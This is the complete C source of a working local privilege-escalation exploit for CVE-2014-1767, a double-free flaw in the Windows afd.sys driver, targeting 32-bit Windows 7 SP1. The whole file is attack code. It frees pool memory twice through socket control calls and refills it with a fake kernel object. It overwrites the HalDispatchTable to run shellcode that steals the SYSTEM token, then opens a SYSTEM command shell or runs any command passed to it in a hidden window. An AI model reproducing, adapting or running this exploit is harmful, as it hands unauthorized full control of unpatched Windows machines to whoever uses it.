//
// Privilege-escalation Exp for Cve-2014-1767 Afd.sys double-free vulnerability
//
// Win7(6.1.7601) 32bit
//
// By 0x710DDDD
//
// 2014-11-14
//

#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "WS2_32.lib")
 
#define _Out_
#define _In_
#define _In_opt_
#define _Out_opt_

/////////////////////////////////////////////////////////////
 
typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
	HANDLE Section;
	PVOID  MappedBase;
	PVOID  Base;
	ULONG  Size;
	ULONG  Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT PathLength;
	CHAR   ImageName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION {
	ULONG Count;
	SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

typedef struct _IO_STATUS_BLOCK {
  union {
    NTSTATUS Status;
    PVOID    Pointer;
  };
  ULONG_PTR Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

////////////////////////////////////////////////////////

// type cheat
typedef PVOID   POBJECT_ATTRIBUTES ;
typedef PVOID   PEPROCESS ;
typedef LONG    KPROFILE_SOURCE ;
typedef LONG    WORKERFACTORYINFOCLASS ;
typedef LONG    SYSTEM_INFORMATION_CLASS ;
typedef LONG    NTSTATUS ;

/////////////////////////////////////////////////////////

typedef LONG   (NTAPI *PPsLookupProcessByProcessId)(HANDLE, PEPROCESS *) ;

typedef NTSTATUS (NTAPI *PNtQuerySystemInformation)(
    _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,
    _Out_     PVOID SystemInformation,
    _In_      ULONG SystemInformationLength,
    _Out_opt_ PULONG ReturnLength ) ;


typedef NTSTATUS (NTAPI *PNtCreateWorkerFactory)(
    _Out_ PHANDLE WorkerFactoryHandleReturn,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ HANDLE CompletionPortHandle,
    _In_ HANDLE WorkerProcessHandle,
    _In_ PVOID StartRoutine,
    _In_opt_ PVOID StartParameter,
    _In_opt_ ULONG MaxThreadCount,
    _In_opt_ SIZE_T StackReserve,
    _In_opt_ SIZE_T StackCommit
    );
	
typedef NTSTATUS (NTAPI *PNtSetInformationWorkerFactory)(
    _In_ HANDLE WorkerFactoryHandle,
    _In_ WORKERFACTORYINFOCLASS WorkerFactoryInformationClass,
    _In_ PVOID WorkerFactoryInformation,
    _In_ ULONG WorkerFactoryInformationLength
    );
 
typedef NTSTATUS (NTAPI *PNtQueryIntervalProfile)(
    _In_  KPROFILE_SOURCE ProfileSource,
    _Out_ PULONG          Interval
    );

typedef NTSTATUS (NTAPI *PNtQueryEaFile)(
	_In_ HANDLE FileHandle,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _Out_ PVOID Buffer,
    _In_ ULONG Length,
    _In_ BOOLEAN ReturnSingleEntry,
    _In_ PVOID EaList,
    _In_ ULONG EaListLength,
    _In_opt_ PULONG EaIndex OPTIONAL,
    _In_ BOOLEAN RestartScan
    );

typedef NTSTATUS (NTAPI *PNtQueryInformationWorkerFactory)(
    _In_ HANDLE WorkerFactoryHandle,
    _In_ WORKERFACTORYINFOCLASS WorkerFactoryInformationClass,
    _Out_ PVOID WorkerFactoryInformation,
    _In_ ULONG WorkerFactoryInformationLength,
    _Out_opt_ PULONG ReturnLength
    ); 

/////////////////////////////////////////////////////////


PNtCreateWorkerFactory           fpCreateWorkerFactory           = NULL ;
PNtSetInformationWorkerFactory   fpSetInformationWorkerFactory   = NULL ;
PNtQueryIntervalProfile          fpQueryIntervalProfile          = NULL ;
PNtQuerySystemInformation        fpQuerySystemInformation        = NULL ;
PNtQueryEaFile                   fpQueryEaFile                   = NULL ;        
PNtQueryInformationWorkerFactory fpQueryInformationWorkerFactory = NULL ;

PPsLookupProcessByProcessId      kfpLookupProcessById            = NULL ;
PVOID						     kHalDsipatchTable               = NULL ;
PVOID                            kfpHaliQuerySystemInformation   = NULL ;


ULONG dwCurProcessId    = 0  ;
ULONG dwSystemProcessId = 0  ;
ULONG dwTokenOffset     = 0xF8 ; // Windows 7,6.1 X86

HANDLE hWorkerFactory   = NULL ;

//////////////////////////////////////

void PrintMsgExit(const char *formatString, ...)
{
  va_list  va ; 
  va_start(va, formatString) ;
  vprintf(formatString, va) ;
  ExitProcess(0) ;
}

// fake HaliQuerySystemInformation
NTSTATUS NTAPI ShellCode(ULONG a, ULONG b, PVOID c, PULONG d)
{
	PEPROCESS pCur, pSys ;
	kfpLookupProcessById((HANDLE)dwCurProcessId,    &pCur);
	kfpLookupProcessById((HANDLE)dwSystemProcessId, &pSys);
 
	// Change to system token
	*(PVOID *)((ULONG_PTR)pCur + dwTokenOffset) = *(PVOID *)((ULONG_PTR)pSys + dwTokenOffset);

	// Disable our handle's handle-table-entry to avoid BSOD
	PBYTE ObjectTable = *(PBYTE *)((ULONG_PTR)pCur + 0x0f4)  ;
	PBYTE HandleTableEntry =  (PBYTE)(*(ULONG_PTR*)(ObjectTable) + 2*((ULONG_PTR)hWorkerFactory & 0xFFFFFFFC)) ;
	*(PVOID*)HandleTableEntry    = NULL ;
	*(ULONG*)(ObjectTable+0x30) -= 1 ;

	// Reset dispatch table hook
	*(PVOID *)((ULONG_PTR)kHalDsipatchTable+sizeof(PVOID)) = kfpHaliQuerySystemInformation ;

	return  0 ;
}


HMODULE GetKrnlNtBase(char *szNtName)
{	
	char  Buffer[0xA]  ;
	DWORD dwRetLength ;
	
	DWORD SystemModuleInfo = 0x0B ;
	if(0xC0000004 != fpQuerySystemInformation(SystemModuleInfo, Buffer, 0x0A, &dwRetLength))
	{
		printf("fpQuerySystemInformation FAILED 1\n") ;
		ExitProcess(0) ;
	}
	
	PSYSTEM_MODULE_INFORMATION pBuf = (PSYSTEM_MODULE_INFORMATION)LocalAlloc(LMEM_ZEROINIT, 
	                                                                         dwRetLength) ;
	
	if(0 != fpQuerySystemInformation(SystemModuleInfo, pBuf, dwRetLength, &dwRetLength))
	{
		printf("fpQuerySystemInformation FAILED 2\n") ;
		ExitProcess(0) ;
	}	
 
 	PSYSTEM_MODULE_INFORMATION_ENTRY pModEntry = pBuf->Module ;
 	HMODULE hModuleBase = NULL ;
 	
	for(ULONG i = 0 ; i < pBuf->Count ; i++ )
  	{
	    if(!hModuleBase && strstr(pModEntry->ImageName, "nt") && strstr(pModEntry->ImageName, "exe"))
	    {
		    strcpy_s(szNtName, MAX_PATH, (char*)((ULONG_PTR)pModEntry->ImageName + pModEntry->PathLength)) ;
		    hModuleBase = (HMODULE)(pModEntry->Base) ;
		    break ;
	    }
	    pModEntry++ ;
  	}
 
 	if(hModuleBase == NULL)
 	{
 		printf("FAIL : Get Ntoskrnl Base\n") ;
 		ExitProcess(0) ;
 	}
 	
  	LocalFree(pBuf);
  	return hModuleBase;
}


DWORD InitExpVars()
{
	HMODULE hNtdll ;
  
	hNtdll = GetModuleHandleA("ntdll.dll");
 	
 	if(hNtdll == NULL)
 	{
 		printf("FAIL : hNtdll == NULL \n") ;
 		ExitProcess(0) ;
 	}
	
	fpCreateWorkerFactory         = (PNtCreateWorkerFactory)GetProcAddress(hNtdll, "ZwCreateWorkerFactory");
	fpSetInformationWorkerFactory = (PNtSetInformationWorkerFactory)GetProcAddress(hNtdll, "ZwSetInformationWorkerFactory");
	fpQueryIntervalProfile        = (PNtQueryIntervalProfile)GetProcAddress(hNtdll, "ZwQueryIntervalProfile");
	fpQuerySystemInformation      = (PNtQuerySystemInformation)GetProcAddress(hNtdll, "ZwQuerySystemInformation");
	fpQueryEaFile                 = (PNtQueryEaFile)GetProcAddress(hNtdll, "ZwQueryEaFile");
	fpQueryInformationWorkerFactory = (PNtQueryInformationWorkerFactory)GetProcAddress(hNtdll, "ZwQueryInformationWorkerFactory") ;

  	if( !fpCreateWorkerFactory || 
		!fpSetInformationWorkerFactory || 
		!fpQueryIntervalProfile || 
		!fpQuerySystemInformation || 
		!fpQueryInformationWorkerFactory )
  	{
  		printf("FAIL : GetProcAddress Kernel Function Address FAIL \n") ;
  		ExitProcess(0) ;
  	}
  	
	char NtKernelName[MAX_PATH] ;
  
	HMODULE hKrnlNtBase = GetKrnlNtBase(NtKernelName);
	HMODULE hUserNtBase = LoadLibraryA(NtKernelName);
 
	kfpLookupProcessById = (PPsLookupProcessByProcessId)((ULONG_PTR)GetProcAddress(hUserNtBase, \
  						    "PsLookupProcessByProcessId") - \
						    (ULONG_PTR)hUserNtBase + \
						    (ULONG_PTR)hKrnlNtBase ) ;
	if((ULONG_PTR)kfpLookupProcessById == (ULONG_PTR)hKrnlNtBase-(ULONG_PTR)hUserNtBase)
	{
		printf("GetProcAddress kfpLookupProcessById FAIL !\n") ;
		ExitProcess(0) ;
	}

	kHalDsipatchTable =  (PVOID)((ULONG_PTR)GetProcAddress(hUserNtBase, \
  								   "HalDispatchTable") - \
								   (ULONG_PTR)hUserNtBase + \
								   (ULONG_PTR)hKrnlNtBase );
	if((ULONG_PTR)kHalDsipatchTable == (ULONG_PTR)hKrnlNtBase-(ULONG_PTR)hUserNtBase)
	{
		printf("GetProcAddress kHalDsipatchTable FAIL !\n") ;
		ExitProcess(0) ;
	}

	dwCurProcessId      = GetCurrentProcessId() ;
	dwSystemProcessId   = 4 ;
  
	FreeLibrary(hUserNtBase);

	printf("fpCreateWorkerFactory: %p\n", fpCreateWorkerFactory) ;
	printf("fpSetInformationWorkerFactory: %p\n", fpSetInformationWorkerFactory) ;
	printf("fpQuerySystemInformation: %p\n", fpQuerySystemInformation) ; 
	printf("fpQueryIntervalProfile: %p\n", fpQueryIntervalProfile) ;
	printf("fpQueryEaFile: %p\n", fpQueryEaFile) ;
	printf("fpQueryInformationWorkerFactory: %p\n", fpQueryInformationWorkerFactory) ;


	printf("kfpLookupProcessById: %p\n", kfpLookupProcessById) ;
	printf("kHalDsipatchTable: %p\n", kHalDsipatchTable) ;
	
	printf("ShellCode: %p\n", ShellCode) ;

	return 1;
}
 
 

DWORD WINAPI ThreadProc(LPVOID lParam) 
{
	 
	InitExpVars() ;
	
	// 0xA0 == WorkFactory Allocated Object Size
	const DWORD FakeObjSize = 0xA0 ;

	DWORD mdlSize = FakeObjSize ;
	DWORD virtualAddress = 0x710DDDD ;
	DWORD length = ((mdlSize - 0x1C)/4 - (virtualAddress%4 ? 1:0))*0x1000 ;

	static BYTE inbuf1[0x30] ;
	memset(inbuf1, 0, sizeof(inbuf1)) ;
	*(ULONG*)(inbuf1+0x18)  = virtualAddress ;
	*(ULONG*)(inbuf1+0x1C)  = length ;
	*(ULONG*)(inbuf1+0x28)  = 1 ;
	
	static BYTE inbuf2[0x10] ;
	memset(inbuf2, 0, sizeof(inbuf2)) ;
	*(ULONG*)inbuf2    = 1 ;
	*(ULONG*)(inbuf2+4)= 0x0AAAAAAA ;
	
	WSADATA		 WSAData ;
	SOCKET		 s ;
	sockaddr_in  sa ;
	int			 ierr ;

	WSAStartup(0x2, &WSAData) ;
	s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) ;
 
	memset(&sa, 0, sizeof(sa)) ;
	sa.sin_port = htons(135) ;   
	sa.sin_addr.S_un.S_addr = inet_addr("127.0.0.1") ;
	sa.sin_family = AF_INET ; 
	
	ierr = connect(s, (const struct sockaddr *)&sa, sizeof(sa)) ;
 
	// Free MDL structrue (ExFreePool Size 0xA0)
	DeviceIoControl((HANDLE)s, 0x1207F, (LPVOID)inbuf1, 0x30, NULL, 0, NULL, NULL);

	// Occupy freed MDL space with WorkerFactory Object
	HANDLE hCompletionPort = CreateIoCompletionPort( INVALID_HANDLE_VALUE, NULL, 1337, 4) ;
 
    LONG ntStatus = fpCreateWorkerFactory( &hWorkerFactory, 
		                                   GENERIC_ALL, 
										   NULL,
                                           hCompletionPort,
                                           (HANDLE)-1,
                                            NULL,
                                            NULL,
                                            0,
                                            0,
                                            0 );
	printf("hWorkerFactory: %p\n", hWorkerFactory) ;


	// Doubel free --> free WorkerFactory Object
	DeviceIoControl((HANDLE)s, 0x120C3, (LPVOID)inbuf2, 0x10, NULL, 0, NULL, NULL);
 
	IO_STATUS_BLOCK IoStatus ;
	static BYTE FakeWorkerFactory[FakeObjSize] ;
	memset(FakeWorkerFactory, 0, FakeObjSize) ;
	
	static BYTE ObjHead [0x28] = {  0x00, 0x00, 0x00, 0x00, 0xa8, 0x00, 0x00, 0x00,    // 0xa8 == NonPagedPoolCharge
									0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 

		/* objHeader --> +0x10 */   0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,    // pointer count, handle count
									0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x08, 0x00,    // 0x16 == typeIndex
									0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 } ; // ObReferenceObjectByHandle FAIL
	    /* objBody   --> +0x28 */
	memcpy(FakeWorkerFactory, ObjHead, 0x28) ;

	static BYTE  a[0x14] ;
	PVOID *pFakeObj = (PVOID*)((ULONG_PTR)FakeWorkerFactory+0x28) ;

	// Init fakeObj to prepare data for DWORD WRITE on HalDispatchTable in NtSetInfomationWorkerFactory
	*pFakeObj = a ;
	*(PVOID*)(a+0x10) = (PVOID)(((ULONG_PTR)kHalDsipatchTable+sizeof(PVOID)) - 0x1C) ;

	// Init fakeObj to prepare data for DWORD READ on HalDispatchTable in NtQueryInfomationWorkerFactory 
	*(ULONG*)((ULONG_PTR)pFakeObj+0x64) = (ULONG_PTR)kHalDsipatchTable + sizeof(PVOID) - 0xB4;

	// Occupy freed WorkerFactory object with Controled Buffer
	fpQueryEaFile(INVALID_HANDLE_VALUE, &IoStatus, NULL, 0, FALSE, FakeWorkerFactory, FakeObjSize-0x04, NULL, FALSE) ;

	// Read 'HaliQuerySystemInformation' address from HalDispatchTable by NtQueryInformationWorkFactory
	static BYTE kernelRetMem[0x60] ;
	memset(kernelRetMem, 0, sizeof(kernelRetMem)) ;

	fpQueryInformationWorkerFactory( hWorkerFactory,
                                     7,
									 kernelRetMem,
									 0x60,
									 NULL ) ;

	kfpHaliQuerySystemInformation = *(PVOID*)(kernelRetMem+0x50) ;
	printf("kfpHaliQuerySystemInformation: %p\n", kfpHaliQuerySystemInformation) ;

	// Write ShellCode Address to HalDispatchTable+0x4
	static PULONG ShotAddress = (PULONG)ShellCode ;
	fpSetInformationWorkerFactory(hWorkerFactory, 8, &ShotAddress, sizeof(PVOID)) ;
	
	// Trigger from user mode
	ULONG Interval ;
	fpQueryIntervalProfile(2, &Interval) ;
	
	// System Shell
	ShellExecuteA(NULL, "open", "cmd.exe", NULL, NULL, SW_SHOW);

	return 0 ;
}


DWORD main(DWORD argc, char *argv[])
{
  	HANDLE hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ThreadProc, 0, 0, 0);
 
	if(WaitForSingleObject(hThread, 300000))
	{
    	TerminateThread(hThread, 0);
    	PrintMsgExit("FAIL [%d]\n", GetLastError()) ; 
  	}	
  	
	if(argv[1])
  	{
  		STARTUPINFO 	    StartupInfo ;
  		PROCESS_INFORMATION ProcessInfo ;
  		
		memset(&StartupInfo, 0, sizeof(StartupInfo)) ;
		memset(&ProcessInfo, 0, sizeof(ProcessInfo)) ;
    
		StartupInfo.cb = sizeof(STARTUPINFO) ;
		StartupInfo.wShowWindow = SW_HIDE ;
		StartupInfo.dwFlags     = STARTF_USESHOWWINDOW ;
	    CreateProcessA(0, argv[1], 0, 0, 0, 0, 0, 0, &StartupInfo, &ProcessInfo) ;
		WaitForSingleObject(ProcessInfo.hProcess, 600000) ;
		CloseHandle(ProcessInfo.hProcess) ;
		CloseHandle(ProcessInfo.hThread) ;
	}

	return 0 ;
}

